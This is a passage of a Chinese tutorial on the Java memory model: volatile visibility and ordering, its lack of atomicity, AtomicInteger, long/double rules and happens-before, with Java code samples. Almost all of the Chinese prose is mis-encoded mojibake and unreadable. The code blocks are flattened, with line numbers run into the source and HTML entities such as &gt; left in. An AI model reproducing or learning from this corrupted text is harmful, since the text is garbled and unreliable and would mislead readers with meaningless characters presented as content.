çš„å·¥ä½œå†…å­˜ä¸­ï¼Œæ¯æ¬¡ä½¿ç”¨å˜é‡ V ä¹‹å‰å¿…é¡»ä»ä¸»å†…å­˜å»é‡æ–°è·å–æœ€æ–°çš„å€¼ï¼Œç”¨äºä¿è¯çº¿ç¨‹ T èƒ½çœ‹å¾—è§å…¶ä»–çº¿ç¨‹å¯¹å˜é‡ V çš„æœ€æ–°çš„ä¿®æ”¹åçš„å€¼ã€‚ åªæœ‰å½“çº¿ç¨‹ T å¯¹å˜é‡ V æ‰§è¡Œçš„å‰ä¸€ä¸ªåŠ¨ä½œæ˜¯ assign çš„æ—¶å€™ï¼Œçº¿ç¨‹ T å¯¹å˜é‡ V æ‰èƒ½æ‰§è¡Œ store åŠ¨ä½œï¼›åŒæ—¶åªæœ‰å½“çº¿ç¨‹ T å¯¹å˜é‡ V æ‰§è¡Œçš„åä¸€ä¸ªåŠ¨ä½œæ˜¯ store çš„æ—¶å€™ï¼Œçº¿ç¨‹ T å¯¹å˜é‡ V æ‰èƒ½æ‰§è¡Œ assign åŠ¨ä½œã€‚æ‰€ä»¥ï¼Œçº¿ç¨‹ T å¯¹å˜é‡ V çš„ assign æ“ä½œå’Œçº¿ç¨‹ T å¯¹å˜é‡ V çš„ storeã€write åŠ¨ä½œç›¸å…³è”ï¼Œå¿…é¡»ä¸€èµ·è¿ç»­å‡ºç°ã€‚ä¹Ÿå³æ˜¯åœ¨çº¿ç¨‹ T çš„å·¥ä½œå†…å­˜ä¸­ï¼Œæ¯æ¬¡ä¿®æ”¹å˜é‡ V ä¹‹åå¿…é¡»ç«‹åˆ»åŒæ­¥å›ä¸»å†…å­˜ï¼Œç”¨äºä¿è¯çº¿ç¨‹ T å¯¹å˜é‡ V çš„ä¿®æ”¹èƒ½ç«‹åˆ»è¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°ã€‚ å‡å®šåŠ¨ä½œ A æ˜¯çº¿ç¨‹ T å¯¹å˜é‡ V å®æ–½çš„ use æˆ– assign åŠ¨ä½œï¼ŒåŠ¨ä½œ F æ˜¯å’ŒåŠ¨ä½œ A ç›¸å…³è”çš„ load æˆ– store åŠ¨ä½œï¼ŒåŠ¨ä½œ P æ˜¯å’ŒåŠ¨ä½œ F ç›¸å¯¹åº”çš„å¯¹å˜é‡ V çš„ read æˆ– write åŠ¨ä½œï¼›ç±»ä¼¼çš„ï¼Œå‡å®šåŠ¨ä½œ B æ˜¯çº¿ç¨‹ T å¯¹å˜é‡ W å®æ–½çš„ use æˆ– assign åŠ¨ä½œï¼ŒåŠ¨ä½œ G æ˜¯å’ŒåŠ¨ä½œ B ç›¸å…³è”çš„ load æˆ– store åŠ¨ä½œï¼ŒåŠ¨ä½œ Q æ˜¯å’ŒåŠ¨ä½œ G ç›¸å¯¹åº”çš„å¯¹å˜é‡ W çš„ read æˆ– write åŠ¨ä½œã€‚å¦‚æœåŠ¨ä½œ A å…ˆäº Bï¼Œé‚£ä¹ˆ P å…ˆäº Qã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨åŒä¸€ä¸ªçº¿ç¨‹å†…éƒ¨ï¼Œè¢« volatile ä¿®é¥°çš„å˜é‡ä¸ä¼šè¢«æŒ‡ä»¤é‡æ’åºï¼Œä¿è¯ä»£ç çš„æ‰§è¡Œé¡ºåºå’Œç¨‹åºçš„é¡ºåºç›¸åŒã€‚ æ€»ç»“ä¸Šé¢ä¸‰æ¡è§„åˆ™ï¼šå‰é¢ä¸¤æ¡å¯ä»¥æ¦‚æ‹¬ä¸ºï¼švolatile ç±»å‹çš„å˜é‡ä¿è¯å¯¹æ‰€æœ‰çº¿ç¨‹çš„å¯è§æ€§ã€‚ç¬¬ä¸‰æ¡ä¸ºï¼švolatile ç±»å‹çš„å˜é‡ç¦æ­¢äº†æŒ‡ä»¤é‡æ’ä¼˜åŒ–ã€‚ volatile å˜é‡ç¦æ­¢æŒ‡ä»¤é‡æ’è®¡ç®—æœºåœ¨æ‰§è¡Œç¨‹åºæ—¶ï¼Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œç¼–è¯‘å™¨å’Œå¤„ç†å™¨å¸¸å¸¸ä¼šå¯¹æŒ‡ä»¤åšé‡æ’ï¼Œä¸€èˆ¬åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š å•çº¿ç¨‹ç¯å¢ƒé‡Œé¢ç¡®ä¿ç¨‹åºæœ€ç»ˆæ‰§è¡Œç»“æœå’Œä»£ç é¡ºåºæ‰§è¡Œçš„ç»“æœä¸€è‡´ã€‚å¤„ç†å™¨åœ¨è¿›è¡Œé‡æ’åºæ—¶å¿…é¡»è€ƒè™‘æŒ‡ä»¤ä¹‹é—´çš„æ•°æ®ä¾èµ–æ€§ã€‚å¤šçº¿ç¨‹ç¯å¢ƒä¸­çº¿ç¨‹äº¤æ›¿æ‰§è¡Œï¼Œç”±äºç¼–è¯‘å™¨ä¼˜åŒ–é‡æ’çš„å­˜åœ¨ï¼Œä¸¤ä¸ªçº¿ç¨‹ä¸­ä½¿ç”¨çš„å˜é‡èƒ½å¦ä¿è¯ä¸€è‡´æ€§æ˜¯æ— æ³•ç¡®å®šçš„ï¼Œç»“æœæ— æ³•é¢„æµ‹ã€‚ æ™®é€šçš„å˜é‡ä»…ä»…ä¼šä¿è¯åœ¨è¯¥æ–¹æ³•æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰ä¾èµ–èµ‹å€¼ç»“æœçš„åœ°æ–¹éƒ½èƒ½è·å–åˆ°æ­£ç¡®çš„ç»“æœï¼Œä½†ä¸èƒ½ä¿è¯å˜é‡èµ‹å€¼çš„æ“ä½œé¡ºåºå’Œç¨‹åºä»£ç çš„é¡ºåºä¸€è‡´ã€‚å› ä¸ºåœ¨ä¸€ä¸ªçº¿ç¨‹çš„æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­æ— æ³•æ„ŸçŸ¥åˆ°è¿™ä¸€ç‚¹ï¼Œè¿™ä¹Ÿå°±æ˜¯ Java å†…å­˜æ¨¡å‹ä¸­æè¿°çš„æ‰€è°“çš„çº¿ç¨‹å†…éƒ¨è¡¨ç°ä¸ºä¸²è¡Œçš„è¯­ä¹‰ã€‚ä¹Ÿå°±æ˜¯åœ¨å•çº¿ç¨‹å†…éƒ¨ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æˆ–è€…æ„ŸçŸ¥åˆ°çš„ç»“æœå’Œä»£ç é¡ºåºæ˜¯ä¸€è‡´çš„ï¼›å³ä½¿ä»£ç çš„æ‰§è¡Œé¡ºåºå’Œä»£ç é¡ºåºä¸ä¸€è‡´ï¼Œä½†æ˜¯åœ¨éœ€è¦èµ‹å€¼çš„æ—¶å€™ç»“æœä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œæ‰€ä»¥çœ‹èµ·æ¥å°±æ˜¯ä¸²è¡Œçš„ã€‚ä½†å®é™…ç»“æœæœ‰å¯èƒ½ä»£ç çš„æ‰§è¡Œé¡ºåºå’Œä»£ç é¡ºåºæ˜¯ä¸ä¸€è‡´çš„ï¼Œè¿™åœ¨å¤šçº¿ç¨‹ä»£ç ä¸­å°±ä¼šå‡ºç°é—®é¢˜ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819Map configOptions;char[] configText;//volatileç±»å‹å˜é‡volatile boolean initialized = false;//å‡è®¾ä»¥ä¸‹ä»£ç åœ¨çº¿ç¨‹Aä¸­æ‰§è¡Œ//æ¨¡æ‹Ÿè¯»å–é…ç½®ä¿¡æ¯ï¼Œè¯»å–å®Œæˆåè®¤ä¸ºæ˜¯åˆå§‹åŒ–å®ŒæˆconfigOptions = new HashMap();configText = readConfigFile(fileName);processConfigOptions(configText, configOptions);initialized = true;//å‡è®¾ä»¥ä¸‹ä»£ç åœ¨çº¿ç¨‹Bä¸­æ‰§è¡Œ//ç­‰å¾…initializedä¸ºtrueåï¼Œè¯»å–é…ç½®ä¿¡æ¯è¿›è¡Œæ“ä½œwhile ( !initialized) { sleep();}doSomethingWithConfig(); åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œå¦‚æœ initialiezd æ˜¯æ™®é€šå˜é‡ï¼Œæ²¡æœ‰è¢« volatile ä¿®é¥°ï¼Œé‚£ä¹ˆçº¿ç¨‹ A æ‰§è¡Œçš„ä»£ç çš„ä¿®æ”¹åˆå§‹åŒ–å®Œæˆçš„ç»“æœ initialized = true å°±æœ‰å¯èƒ½å…ˆäºä¹‹å‰çš„ä¸‰è¡Œä»£ç æ‰§è¡Œï¼Œè€Œæ­¤æ—¶çº¿ç¨‹ B å‘ç° initialized ä¸º true äº†ï¼Œå°±æ‰§è¡Œ doSomethingWithConfig() æ–¹æ³•ï¼Œä½†æ˜¯é‡Œé¢çš„é…ç½®ä¿¡æ¯éƒ½æ˜¯ Null çš„ï¼Œå°±ä¼šå‡ºç°é—®é¢˜äº†ã€‚å¦‚æœ initialized æ˜¯ volatile ç±»å‹å˜é‡ï¼Œä¿è¯ç¦æ­¢ä»£ç é‡æ’åºä¼˜åŒ–ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿è¯ initialized = true æ‰§è¡Œçš„æ—¶å€™ï¼Œå‰è¾¹çš„ä¸‰è¡Œä»£ç ä¸€å®šæ‰§è¡Œå®Œæˆäº†ï¼Œé‚£ä¹ˆçº¿ç¨‹ B è¯»å–çš„é…ç½®æ–‡ä»¶ä¿¡æ¯å°±æ˜¯æ­£ç¡®çš„ã€‚è·Ÿå…¶ä»–ä¿è¯å¹¶å‘å®‰å…¨çš„å·¥å…·ç›¸æ¯”ï¼Œvolatile çš„æ€§èƒ½ç¡®å®ä¼šå¥½ä¸€äº›ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œvolatile çš„åŒæ­¥æœºåˆ¶æ€§èƒ½è¦ä¼˜äºé”ï¼ˆä½¿ç”¨ synchronized å…³é”®å­—æˆ–è€… Java.util.concurrent åŒ…ä¸­çš„é”ï¼‰ã€‚ä½†æ˜¯ç°åœ¨ç”±äºè™šæ‹Ÿæœºå¯¹é”çš„ä¸æ–­ä¼˜åŒ–å’Œå®è¡Œçš„è®¸å¤šæ¶ˆé™¤åŠ¨ä½œï¼Œå¾ˆéš¾æœ‰ä¸€ä¸ªé‡åŒ–çš„æ¯”è¾ƒï¼›ä½†ä¸è‡ªèº«æ¯”è¾ƒå¯ä»¥ç¡®å®šä¸€ä¸ªåŸåˆ™ï¼švolatile å˜é‡çš„è¯»æ“ä½œå’Œæ™®é€šå˜é‡çš„è¯»æ“ä½œå‡ ä¹æ²¡æœ‰å·®å¼‚ï¼Œä½†æ˜¯å†™æ“ä½œä¼šæ€§èƒ½å·®ä¸€äº›ï¼Œå› ä¸ºè¦åœ¨æœ¬åœ°ä»£ç ä¸­æ’å…¥è®¸å¤šå†…å­˜å±éšœæŒ‡ä»¤æ¥ç¦æ­¢æŒ‡ä»¤é‡æ’åºï¼Œä¿è¯å¤„ç†å™¨ä¸å‘ç”Ÿä»£ç ä¹±åºæ‰§è¡Œè¡Œä¸ºã€‚ volatile å˜é‡ä¿è¯å¯è§æ€§å¯è§æ€§æ˜¯æŒ‡å½“ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†è¿™ä¸ªå˜é‡çš„å€¼ï¼Œæ–°å€¼ï¼ˆä¿®æ”¹åçš„å€¼ï¼‰å¯¹äºå…¶ä»–çº¿ç¨‹æ¥è¯´æ˜¯ç«‹å³å¯ä»¥å¾—çŸ¥çš„ã€‚æ­£å¦‚ä¸Šé¢çš„å‰ä¸¤æ¡è§„åˆ™è§„å®šï¼Œvolatile ç±»å‹çš„å˜é‡æ¯æ¬¡å€¼è¢«ä¿®æ”¹äº†å°±ç«‹å³åŒæ­¥å›ä¸»å†…å­˜ï¼Œæ¯æ¬¡ä½¿ç”¨æ—¶å°±éœ€è¦ä»ä¸»å†…å­˜é‡æ–°è¯»å–å€¼ã€‚è¿”å›åˆ°å‰é¢ JMM å¯¹æ™®é€šå˜é‡çš„è§„åˆ™ä¸­ï¼Œå¹¶æ²¡æœ‰è¦æ±‚è¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥æ™®é€šå˜é‡çš„å€¼æ˜¯ä¸ä¼šç«‹å³å¯¹æ‰€æœ‰çº¿ç¨‹å¯è§çš„ï¼Œå³æ™®é€šå˜é‡ä¸å…·å¤‡å¯è§æ€§ã€‚volatile å˜é‡ä¿è¯å¯è§æ€§çš„éªŒè¯ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 1 éªŒè¯volatileçš„å¯è§æ€§ * 1.1 åŠ å…¥int number=0ï¼Œnumberå˜é‡ä¹‹å‰æ²¡æœ‰æ·»åŠ volatileå…³é”®å­—ä¿®é¥°ï¼Œä¸å…·å¤‡å¯è§æ€§ * 1.2 æ·»åŠ äº†volatileå…³é”®å­—ï¼Œå¯ä»¥è§£å†³å¯è§æ€§é—®é¢˜ */ public class VolatileTest { public static void main(String[] args) { MyData data = new MyData(); new Thread(() - &gt; { System.out.println(Thread.currentThread().getName() + " thread come in"); try { TimeUnit.SECONDS.sleep(3); } catch(InterruptedException e) { e.printStackTrace(); } data.setNumber(); System.out.println(Thread.currentThread().getName() + " thread set number is " + data.number); }, "AAA").start(); while(data.number == 0) { // mainçº¿ç¨‹ä¸€ç›´åœ¨è¿™é‡Œå¾ªç¯ç­‰å¾…ï¼Œç›´åˆ°numberçš„å€¼ä¸å†ç­‰äºé›¶ } System.out.println(Thread.currentThread().getName() + " thread is over, the number is " + data.number); } } class MyData { // int number = 0; // volatileå¯ä»¥ä¿è¯å¯è§æ€§ï¼Œå³å¯ä»¥åŠæ—¶é€šçŸ¥å…¶ä»–çº¿ç¨‹ï¼Œä¸»å†…å­˜ä¸­çš„å˜é‡å€¼å·²ç»è¢«ä¿®æ”¹ volatile int number = 0; public void setNumber() { this.number = 60; } } 123AAA thread come inAAA thread set number is 60main thread is over, the number is 60 volatile å˜é‡ä¸ä¿è¯åŸå­æ€§å¸¸è§è¯¯è§£ï¼švolatile å˜é‡å¯¹æ‰€æœ‰çº¿ç¨‹æ˜¯ç«‹å³å¯è§çš„ï¼Œæ‰€ä»¥å¯¹ volatile å˜é‡çš„æ‰€æœ‰ä¿®æ”¹ï¼ˆå†™æ“ä½œï¼‰éƒ½ç«‹åˆ»èƒ½ååº”åˆ°å…¶ä»–çº¿ç¨‹ä¸­ã€‚æˆ–è€…æ¢å¥è¯è¯´ï¼švolatile å˜é‡åœ¨å„ä¸ªçº¿ç¨‹ä¸­æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥åŸºäº volatile å˜é‡çš„è¿ç®—åœ¨å¹¶å‘ä¸‹æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚è¿™ä¸ªè§‚ç‚¹çš„è®ºæ®æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æ ¹æ®è®ºæ®å¾—å‡ºçš„ç»“è®ºæ˜¯é”™è¯¯çš„ï¼Œå¹¶ä¸èƒ½å¾—å‡ºè¿™æ ·çš„ç»“è®ºã€‚volatile çš„è§„åˆ™ï¼Œä¿è¯äº† readã€loadã€use çš„é¡ºåºå’Œè¿ç»­æ€§ï¼ŒåŒç† assignã€storeã€write ä¹Ÿæ˜¯é¡ºåºå’Œè¿ç»­çš„ã€‚ä¹Ÿå°±æ˜¯è¿™å‡ ä¸ªåŠ¨ä½œæ˜¯åŸå­æ€§çš„ï¼Œä½†æ˜¯å¯¹å˜é‡çš„ä¿®æ”¹ï¼Œæˆ–è€…å¯¹å˜é‡çš„è¿ç®—ï¼Œå´ä¸èƒ½ä¿è¯æ˜¯åŸå­æ€§çš„ã€‚å¦‚æœå¯¹å˜é‡çš„ä¿®æ”¹æ˜¯åˆ†ä¸ºå¤šä¸ªæ­¥éª¤çš„ï¼Œé‚£ä¹ˆå¤šä¸ªçº¿ç¨‹åŒæ—¶ä»ä¸»å†…å­˜æ‹¿åˆ°çš„å€¼æ˜¯æœ€æ–°çš„ï¼Œä½†æ˜¯ç»è¿‡å¤šæ­¥è¿ç®—åå›å†™åˆ°ä¸»å†…å­˜çš„å€¼æ˜¯æœ‰å¯èƒ½å­˜åœ¨è¦†ç›–æƒ…å†µå‘ç”Ÿçš„ã€‚volatile å˜é‡ä¸ä¿è¯åŸå­æ€§çš„éªŒè¯ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839public class VolatileTest{ public static volatile int race = 0; public static void increase() { race++; } private static final int THREADS_COUNT = 20; public static void main(String[] args) { Thread[] threads = new Thread[THREADS_COUNT]; for(int i = 0; i &lt; THREADS_COUNT; i++) { threads[i] = new Thread(new Runnable() { @Override public void run() { for(int j = 0; j &lt; 10000; j++) { increase(); } } }); threads[i].start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println(race); }} 141078 ä¸Šè¿°ä»£ç å°±æ˜¯å¯¹ volatile ç±»å‹çš„å˜é‡å¯åŠ¨äº† 20 ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹å¯¹å˜é‡æ‰§è¡Œ 1w æ¬¡åŠ  1 æ“ä½œï¼Œå¦‚æœ volatile å˜é‡å¹¶å‘æ“ä½œæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œé‚£ä¹ˆç»“æœåº”è¯¥æ˜¯è¾“å‡º 20wï¼Œä½†æ˜¯ç»“æœè¿è¡Œçš„æ—¶å€™æ¯æ¬¡éƒ½æ˜¯å°äº 20wï¼Œè¿™å°±æ˜¯å› ä¸º race++ æ“ä½œä¸æ˜¯åŸå­æ€§çš„ï¼ˆå›¾è§£ï¼‰ï¼Œæ˜¯åˆ†å¤šä¸ªæ­¥éª¤å®Œæˆçš„ã€‚å‡è®¾ä¸¤ä¸ªçº¿ç¨‹ aã€b åŒæ—¶å–åˆ°äº†ä¸»å†…å­˜çš„å€¼æ˜¯ 0ï¼Œè¿™æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œåœ¨è¿›è¡Œ ++ æ“ä½œçš„æ—¶å€™å‡è®¾çº¿ç¨‹ a æ‰§è¡Œåˆ°ä¸€åŠï¼Œçº¿ç¨‹ b æ‰§è¡Œå®Œäº†ï¼Œè¿™æ—¶çº¿ç¨‹ b ç«‹å³åŒæ­¥ç»™äº†ä¸»å†…å­˜ï¼Œä¸»å†…å­˜çš„å€¼ä¸º 1ï¼Œè€Œçº¿ç¨‹ a æ­¤æ—¶ä¹Ÿæ‰§è¡Œå®Œäº†ï¼ŒåŒæ­¥ç»™äº†ä¸»å†…å­˜ï¼Œæ­¤æ—¶çš„å€¼ä»ç„¶æ˜¯ 1ï¼Œçº¿ç¨‹ b çš„ç»“æœè¢«è¦†ç›–æ‰äº†ã€‚ å¦‚æœéœ€è¦è§£å†³ volatile ä¸ä¿è¯åŸå­æ€§çš„é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨ AtomicInteger è¿™æ ·çš„åŸå­åŒ…è£…ç±»å³å¯ä¿è¯åŸå­æ€§ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839public class VolatileTest{ public static AtomicInteger race = new AtomicInteger(); public static void increase() { race.getAndIncrement(); } private static final int THREADS_COUNT = 20; public static void main(String[] args) { Thread[] threads = new Thread[THREADS_COUNT]; for(int i = 0; i &lt; THREADS_COUNT; i++) { threads[i] = new Thread(new Runnable() { @Override public void run() { for(int j = 0; j &lt; 10000; j++) { increase(); } } }); threads[i].start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println(race); }} long å’Œ double å˜é‡long å’Œ double å˜é‡çš„ç‰¹æ®Šè§„åˆ™Java å†…å­˜æ¨¡å‹è¦æ±‚å¯¹ä¸»å†…å­˜å’Œå·¥ä½œå†…å­˜äº¤äº’çš„å…«ç§æ“ä½œæ˜¯åŸå­æ€§çš„ï¼Œæ­£å¦‚ä¸Šæ–‡æ‰€è®²ï¼Œå¯¹ long å’Œ double æœ‰ä¸€äº›ç‰¹æ®Šè§„åˆ™ã€‚å…«ç§æ“ä½œä¸­ lockã€unlockã€readã€loadã€useã€assignã€storeã€write å¯¹å¾… 32 ä½çš„åŸºæœ¬æ•°æ®ç±»å‹éƒ½æ˜¯åŸå­æ“ä½œï¼Œå¯¹å¾… long å’Œ double è¿™ä¸¤ä¸ª 64 ä½çš„æ•°æ®ï¼ŒJava è™šæ‹Ÿæœºè§„èŒƒå¯¹ Java å†…å­˜æ¨¡å‹çš„è§„å®šä¸­ç‰¹åˆ«å®šä¹‰äº†ä¸€æ¡ç›¸å¯¹å®½æ¾çš„è§„åˆ™ï¼šå…è®¸è™šæ‹Ÿæœºå°†æ²¡æœ‰è¢« volatile ä¿®é¥°çš„ 64 ä½æ•°æ®çš„è¯»å†™æ“ä½œåˆ’åˆ†ä¸ºä¸¤æ¬¡ 32 ä½çš„æ“ä½œæ¥è¿›è¡Œï¼Œä¹Ÿå°±æ˜¯å…è®¸è™šæ‹Ÿæœºä¸ä¿è¯å¯¹ 64 ä½æ•°æ®çš„ readã€loadã€store å’Œ write è¿™ 4 ä¸ªåŠ¨ä½œçš„æ“ä½œæ˜¯åŸå­çš„ã€‚è¿™ä¹Ÿå°±æ˜¯å¸¸è¯´çš„ long å’Œ double çš„éåŸå­æ€§åå®šï¼ˆNonautomic Treatment of double and long Variablesï¼‰ã€‚ å¹¶å‘å†…å­˜æ¨¡å‹çš„å®è´¨Java å†…å­˜æ¨¡å‹å›´ç»•ç€å¹¶å‘è¿‡ç¨‹ä¸­å¦‚ä½•å¤„ç†åŸå­æ€§ã€å¯è§æ€§å’Œé¡ºåºæ€§è¿™ä¸‰ä¸ªç‰¹å¾æ¥è®¾è®¡çš„ã€‚ åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼š ç”± Java å†…å­˜æ¨¡å‹æ¥ç›´æ¥ä¿è¯åŸå­æ€§çš„å˜é‡æ“ä½œåŒ…æ‹¬ readã€loadã€useã€assignã€storeã€write è¿™ 6 ç§æ“ä½œï¼Œè™½ç„¶å­˜åœ¨ long å’Œ double çš„ç‰¹ä¾‹ï¼Œä½†åŸºæœ¬å¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œç›®å‰è™šæ‹ŸæœºåŸºæœ¬éƒ½å¯¹å…¶å®ç°äº†åŸå­æ€§ã€‚å¦‚æœéœ€è¦æ›´å¤§èŒƒå›´çš„æ§åˆ¶ï¼Œlock å’Œ unlock ä¹Ÿå¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚lock å’Œ unlock è™½ç„¶æ²¡æœ‰è¢«è™šæ‹Ÿæœºç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨ï¼Œä½†æ˜¯æä¾›äº†å­—èŠ‚ç å±‚æ¬¡çš„æŒ‡ä»¤ monitorenter å’Œ monitorexit å¯¹åº”è¿™ä¸¤ä¸ªæ“ä½œï¼Œå¯¹åº”åˆ° Java ä»£ç å°±æ˜¯ synchronized å…³é”®å­—ï¼Œå› æ­¤åœ¨ synchronized å—ä¹‹é—´çš„ä»£ç éƒ½å…·æœ‰åŸå­æ€§ã€‚ å¯è§æ€§ï¼ˆVisibilityï¼‰ï¼š å¯è§æ€§æ˜¯æŒ‡ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†ä¸€ä¸ªå˜é‡çš„å€¼åï¼Œå…¶ä»–çº¿ç¨‹ç«‹å³å¯ä»¥æ„ŸçŸ¥åˆ°è¿™ä¸ªå€¼çš„ä¿®æ”¹ã€‚æ­£å¦‚å‰é¢æ‰€è¯´ï¼Œvolatile ç±»å‹çš„å˜é‡åœ¨ä¿®æ”¹åä¼šç«‹å³åŒæ­¥ç»™ä¸»å†…å­˜ï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™ä¼šä»ä¸»å†…å­˜é‡æ–°è¯»å–ï¼Œæ˜¯ä¾èµ–ä¸»å†…å­˜ä¸ºä¸­ä»‹æ¥ä¿è¯å¤šçº¿ç¨‹ä¸‹å˜é‡å¯¹å…¶ä»–çº¿ç¨‹çš„å¯è§æ€§çš„ã€‚é™¤äº† volatile ä¹‹å¤–ï¼Œsynchronized å’Œ final ä¹Ÿå¯ä»¥å®ç°å¯è§æ€§ã€‚synchronized å…³é”®å­—æ˜¯é€šè¿‡ unlock ä¹‹å‰å¿…é¡»æŠŠå˜é‡åŒæ­¥å›ä¸»å†…å­˜æ¥å®ç°çš„ï¼Œfinal åˆ™æ˜¯åœ¨åˆå§‹åŒ–åå°±ä¸ä¼šæ›´æ”¹ï¼Œæ‰€ä»¥åªè¦åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­æ²¡æœ‰æŠŠ this æŒ‡é’ˆä¼ é€’å‡ºå»ä¹Ÿèƒ½ä¿è¯å¯¹å…¶ä»–çº¿ç¨‹çš„å¯è§æ€§ã€‚ æœ‰åºæ€§ï¼š æœ‰åºæ€§ä»ä¸åŒçš„è§’åº¦æ¥çœ‹æ˜¯ä¸åŒçš„ã€‚å•çº¯å•çº¿ç¨‹æ¥çœ‹éƒ½æ˜¯æœ‰åºçš„ï¼Œä½†åˆ°äº†å¤šçº¿ç¨‹å°±ä¼šè·Ÿæˆ‘ä»¬é¢„æƒ³çš„ä¸ä¸€æ ·ã€‚å¯ä»¥è¿™ä¹ˆè¯´ï¼šå¦‚æœåœ¨æœ¬çº¿ç¨‹å†…éƒ¨è§‚å¯Ÿï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ‰åºçš„ï¼›å¦‚æœåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­è§‚å¯Ÿå¦ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯æ— åºçš„ã€‚å‰åŠå¥è¯´çš„å°±æ˜¯çº¿ç¨‹å†…è¡¨ç°ä¸ºä¸²è¡Œçš„è¯­ä¹‰ï¼ŒååŠå¥æŒ‡çš„æ˜¯æŒ‡ä»¤é‡æ’ç°è±¡å’Œä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜ä¹‹é—´åŒæ­¥å­˜åœ¨å»¶è¿Ÿçš„ç°è±¡ã€‚ä¿è¯æœ‰åºæ€§çš„å…³é”®å­—æœ‰ volatile å’Œ synchronizedï¼Œå…¶ä¸­ volatile ç¦æ­¢äº†æŒ‡ä»¤é‡æ’åºï¼Œè€Œ synchronized åˆ™ç”±ä¸€ä¸ªå˜é‡åœ¨åŒä¸€æ—¶åˆ»åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹å¯¹å…¶è¿›è¡Œlockæ“ä½œæ¥ä¿è¯ã€‚ æ€»ç»“ï¼šsynchronized å¯¹ä¸‰ç§ç‰¹æ€§éƒ½æœ‰æ”¯æŒï¼Œè™½ç„¶ç®€å•ï¼Œä½†æ˜¯å¦‚æœæ— æ§åˆ¶åœ°æ»¥ç”¨å¯¹æ€§èƒ½å°±ä¼šäº§ç”Ÿè¾ƒå¤§å½±å“ã€‚volatile åªæ”¯æŒå¯è§æ€§å’Œæœ‰åºæ€§ï¼ˆç¦æ­¢æŒ‡ä»¤é‡æ’ï¼‰ï¼Œä¸æ”¯æŒåŸå­æ€§ å…ˆè¡Œå‘ç”ŸåŸåˆ™å¦‚æœ Java å†…å­˜æ¨¡å‹ä¸­æ‰€æœ‰çš„æœ‰åºæ€§éƒ½è¦ä¾é  volatile å’Œ synchronized æ¥å®ç°ï¼Œé‚£æ˜¯ä¸æ˜¯éå¸¸ç¹çã€‚Java è¯­è¨€ä¸­æœ‰ä¸€ä¸ª â€œå…ˆè¡Œå‘ç”ŸåŸåˆ™â€ï¼Œæ˜¯åˆ¤æ–­æ•°æ®æ˜¯å¦å­˜åœ¨ç«äº‰ã€çº¿ç¨‹æ˜¯å¦å®‰å…¨çš„ä¸»è¦ä¾æ®ã€‚ ä»€ä¹ˆæ˜¯å…ˆè¡Œå‘ç”ŸåŸåˆ™ å…ˆè¡Œå‘ç”ŸåŸåˆ™æ˜¯ Java å†…å­˜æ¨¡å‹ä¸­å®šä¹‰çš„ä¸¤ä¸ªæ“ä½œä¹‹é—´çš„ååºå…³ç³»ã€‚æ¯”å¦‚è¯´æ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Bï¼Œé‚£ä¹ˆåœ¨ B æ“ä½œå‘ç”Ÿä¹‹å‰ï¼ŒA æ“ä½œäº§ç”Ÿçš„ â€œå½±å“â€ éƒ½ä¼šè¢«æ“ä½œ B æ„ŸçŸ¥åˆ°ã€‚è¿™é‡Œçš„å½±å“æ˜¯æŒ‡ä¿®æ”¹äº†å†…å­˜ä¸­çš„å…±äº«å˜é‡ã€å‘é€äº†æ¶ˆæ¯ã€è°ƒç”¨äº†æ–¹æ³•ç­‰ã€‚ Java å†…å­˜æ¨¡å‹è‡ªå¸¦å…ˆè¡Œå‘ç”ŸåŸåˆ™æœ‰å“ªäº› ç¨‹åºæ¬¡åºåŸåˆ™ï¼šåœ¨ä¸€ä¸ªçº¿ç¨‹å†…éƒ¨ï¼ŒæŒ‰ç…§ä»£ç çš„é¡ºåºï¼Œä¹¦å†™åœ¨å‰é¢çš„å…ˆè¡Œå‘ç”Ÿä¸åè¾¹çš„ã€‚æˆ–è€…æ›´å‡†ç¡®çš„è¯´æ˜¯åœ¨æ§åˆ¶æµé¡ºåºå‰é¢çš„å…ˆè¡Œå‘ç”Ÿä¸æ§åˆ¶æµåé¢çš„ï¼Œè€Œä¸æ˜¯ä»£ç é¡ºåºï¼Œå› 